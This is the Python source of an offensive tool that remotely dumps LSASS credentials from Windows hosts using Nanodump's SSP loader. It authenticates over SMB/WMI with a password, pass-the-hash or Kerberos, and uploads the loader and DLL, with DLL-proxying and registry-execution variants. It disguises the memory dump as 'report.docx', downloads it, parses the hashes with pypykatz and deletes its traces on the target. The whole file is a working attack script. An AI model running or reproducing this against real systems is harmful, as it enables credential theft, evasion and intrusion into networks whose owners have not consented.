import argparse
import subprocess
import base64, gzip, time, os, stat, sys
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.ndr import NULL
from pypykatz.pypykatz import pypykatz
from six import PY2
from wmi_reg_exec import WmiRegExec
from dll_proxy_exec import DLLProxyExec

# These are the default files provided by Nanodump
# Don't trust random blobs of base64 encoded exes! ;)
loader_data = gzip.decompress(base64.b64decode(""))
dll_data = gzip.decompress(base64.b64decode(""))
rsig_data = gzip.decompress(base64.b64decode(""))

class RemoteSSPDump:
    def __init__(self, target_host='', username='', password='', domain='', nthash='', doKerberos=False, kdcHost=None, remotePath=None, timeout=None):
        self.__target_host = target_host
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = nthash
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__remoteShare = f'{remotePath.split(":")[0]}$'
        self.__remotePath = remotePath.split(":")[1]
        self.__rFullPath = f"{self.__remoteShare[:-1]}:{self.__remotePath}\\"
        self.__timeout = timeout
        self.__dumpPath = 'C:\\Windows\\Temp\\report.docx'
        self.__smbclient = None

    def login(self):
        self.__smbclient = SMBConnection(self.__target_host, self.__target_host)

        if self.__doKerberos == False:
            self.__smbclient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        else:
            self.__smbclient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost)

    def upload(self, infile, outfile):
        self.login()

        with open(infile, "rb") as p:
            self.__smbclient.putFile(self.__remoteShare, f"{self.__remotePath}\\{outfile}", p.read)
        self.__smbclient.close()

    def download(self, file):
        self.login()

        time_count = 0
        fh = open(file,'wb')
        try:
            self.__smbclient.getFile(self.__remoteShare, self.__dumpPath[2:], fh.write)
        except Exception as e:
            print(e)
            if str(e).find('STATUS_SHARING_VIOLATION') >= 0 or str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                # Output not finished, let's wait
                if time_count < 10:
                    time.sleep(1)
                    time_count += 1
                else:
                    print("[!] Dump file failed to transfer! Nanodump may have failed...")
                    sys.exit(1)
                pass
            elif str(e).find('Broken') >= 0:
                # The SMB Connection might have timed out, let's try reconnecting
                logging.debug('Connection broken, trying to recreate it')
                self.__smbclient.reconnect()
                return self.get_output()
        fh.close()
        self.__smbclient.close()

    def execute(self, data):
        dcom = DCOMConnection(self.__target_host, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              None, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)

        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32Process, _ = iWbemServices.GetObject('Win32_Process')

            pwd = self.__rFullPath
            shell = "cmd.exe /Q /c "
            command = shell + data

            if PY2:
                win32Process.Create(command.decode(sys.stdin.encoding), pwd, None)
            else:
                win32Process.Create(command, pwd, None)

        except (Exception, KeyboardInterrupt) as e:
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        dcom.disconnect()

    def parse(self):
        result = subprocess.run("./restore_signature report.docx", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, shell=True).stdout
        dumpfile = open("report.docx", "rb")
        pypy_parse = pypykatz.parse_minidump_external(dumpfile, chunksize=60*1024)
        dumpfile.close()
        res = pypy_parse.to_grep()
        print(res[:-1])

    def run(self, exec_option, file, exe, reg_key):
        if os.path.exists("restore_signature") == False:
            with open("restore_signature", "wb") as f:
                os.chmod("restore_signature", stat.S_IEXEC)
                f.write(rsig_data)
        if os.path.exists("load_ssp.x64.exe") == False or os.path.exists("nanodump_ssp.x64.dll") == False:
            print("[+] Nanodump files missing. Using default emdedded files...")
            with open("load_ssp.x64.exe", "wb") as f:
                f.write(loader_data)
            with open("nanodump_ssp.x64.dll", "wb") as f:
                f.write(dll_data)
        if exec_option == "dll_proxy":
            proxyexec = DLLProxyExec(self.__target_host, self.__username, self.__password, self.__domain, self.__nthash, args.k, args.dc_ip, self.__rFullPath, False)
            print("[SMB] Uploading SSP DLL...")
            self.upload("nanodump_ssp.x64.dll", "nssp.dll")
            proxyexec.run(file, exe)
            print(f"[+] Sleeping for {self.__timeout} seconds...")
            time.sleep(self.__timeout)
            print("[SMB] Downloading LSASS dump...")
            self.download("report.docx")
            print("[WMI] Cleaning up files on target...")
            self.execute(f"del {self.__rFullPath}\\{exe} && del {self.__rFullPath}\\{file} && del {self.__rFullPath}\\nssp.dll && del {self.__dumpPath}")
        elif exec_option == "reg_exec":
            regExec = WmiRegExec(self.__target_host, self.__username, self.__password, self.__domain, self.__nthash, args.k, args.dc_ip, self.__rFullPath, "", reg_key)
            print("[SMB] Uploading SSP DLL...")
            self.upload("nanodump_ssp.x64.dll", "nssp.dll")
            regExec.execFile("load_ssp.x64.exe", f"{self.__rFullPath}\\nssp.dll", "", True, "")
            print(f"[+] Sleeping for {self.__timeout} seconds...")
            time.sleep(self.__timeout)
            print("[SMB] Downloading LSASS dump...")
            self.download("report.docx")
            print("[WMI] Cleaning up files on target...")
            self.execute(f"del {self.__rFullPath}\\nssp.dll && del {self.__dumpPath}")
        else:
            print("[SMB] Uploading SSP Loader...")
            self.upload("load_ssp.x64.exe", "loadnssp.exe")
            print("[SMB] Uploading SSP DLL via SMB...")
            self.upload("nanodump_ssp.x64.dll", "nssp.dll")
            print("[WMI] Executing Loader...")
            self.execute(f"{self.__rFullPath}\\loadnssp.exe {self.__rFullPath}\\nssp.dll")
            print(f"[+] Sleeping for {self.__timeout} seconds...")
            time.sleep(self.__timeout)
            print("[SMB] Downloading LSASS dump...")
            self.download("report.docx")
            print("[WMI] Cleaning up files on target...")
            self.execute(f"del {self.__rFullPath}\\loadnssp.exe && del {self.__rFullPath}\\nssp.dll && del {self.__dumpPath}")
        print("[+] Parsing dump file for hashes: ")
        self.parse()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Dump creds from LSASS remotely using Nanodump SSP")
    parser.add_argument("target", help="[[domain/]username[:password]@]<hostname or address>", type=str)
    parser.add_argument('-t', '-timeout', dest='timeout', help='Timeout in seconds to wait for LSASS dump file to be created (Default: 3)', metavar='timeout', default="3")
    parser.add_argument('-rp', '-remote-path', dest='remotePath', help='The remote path to write files to (Default: C:\\Windows\\Temp)', metavar='remotePath', default="C:\\Windows\\Temp\\")
    parser.add_argument('-re', '-reg-exec', dest='reg_exec', action="store_true", help='Execute SSP loader by writing it to the registry and executing it in memory with PowerShell')
    parser.add_argument('-dp', '-dll-proxy', dest='dll_proxy', action="store_true", help='Execute SSP loader via DLL Proxying (See below for options)')
    dp_args = parser.add_argument_group('dll proxying options')
    dp_args.add_argument('-f', '-file', dest='file', help='DLL file to execute', metavar='dll', default='')
    dp_args.add_argument('-e', '-exe', dest='exe', help='System32 EXE used to execute DLL file', metavar='exe', default='')
    reg_args = parser.add_argument_group('registry execute options')
    reg_args.add_argument('-r', '-reg-key', dest='reg_key', help='Registry key to write file to (Default: HKLM\\Software\\Microsoft\\Edge)', metavar='key', default='HKLM\\Software\\Microsoft\\Edge')
    group = parser.add_argument_group('authentication')
    group.add_argument('-H', '-hash', dest='hash', help='NTHash for login via PtH', metavar='hash', default='')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication with credentials from the KRB5CCNAME ccache file')
    group.add_argument('-dc-ip', dest='dc_ip', help='IP Address of the domain controller (useful for Kerberos auth)', metavar='IPAddress')
    if len(sys.argv) == 1:
        parser.print_help()
        exit()
    args = parser.parse_args()
    username = ""
    password = ""
    domain = ""
    nthash = ""
    nthash = args.hash
    timeout = int(args.timeout)
    wmi_reg_exec = True
    domain, username, password, target = parse_target(args.target)
    if args.k == True:
        domain = ""
    if password == '' and username != '' and args.hash == "" and args.k == False:
        from getpass import getpass
        password = getpass("[+] Password: ")
    if args.dll_proxy == False and args.file != "" or args.dll_proxy == False and args.exe != "":
        args.dll_proxy = True
    if args.dll_proxy == True and args.file == "" or args.dll_proxy == True and args.exe == "":
        print("[!] DLL proxying was selected, but a dll or exe was not supplied! Please supply them with the -d and -e flags.")
        exit()
    if args.dll_proxy == True:
            exec_option = "dll_proxy"
    elif args.reg_exec == True:
        exec_option = "reg_exec"
    else:
        exec_option = ""
    if args.remotePath[-1] == "\\":
        rpath = args.remotePath[:-1]
    else:
        rpath = args.remotePath
    try:
        dumper = RemoteSSPDump(target, username, password, domain, nthash, args.k, args.dc_ip, rpath, timeout)
        dumper.run(exec_option, args.file, args.exe, args.reg_key)
    except Exception as e:
        if "STATUS_ACCESS_DENIED" in str(e):
            print(
                f"[!] The user {domain}\\{username} is not local administrator on this system"
            )
        elif "STATUS_LOGON_FAILURE" in str(e):
            print(
                f"[!] The provided credentials for the user '{domain}\\{username}' are invalid or the user does not exist"
            )
        else:
            print(f"[!] Some failure happened: ({str(e)})")
        raise Exception
